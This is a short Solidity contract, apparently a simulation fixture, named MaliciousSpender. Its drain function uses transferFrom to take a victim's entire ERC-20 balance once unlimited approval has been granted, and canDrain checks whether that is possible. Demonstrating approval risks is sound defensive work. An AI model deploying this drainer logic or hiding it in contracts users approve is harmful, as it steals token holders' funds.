// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousSpender {
    // Drain function that transfers all tokens from victim to attacker
    // Only works if spender has unlimited approval
    function drain(address token, address from, address to) external {
        IERC20 erc20 = IERC20(token);
        uint256 balance = erc20.balanceOf(from);
        require(balance > 0, "No balance to drain");

        // This will succeed if approval is unlimited (MAX_UINT)
        // In real malicious contracts, this might be called automatically
        erc20.transferFrom(from, to, balance);
    }

    // Check if we can drain (for simulation purposes)
    function canDrain(address token, address from) external view returns (bool) {
        IERC20 erc20 = IERC20(token);
        uint256 balance = erc20.balanceOf(from);
        uint256 allowance = erc20.allowance(from, address(this));

        return balance > 0 && allowance >= balance;
    }
}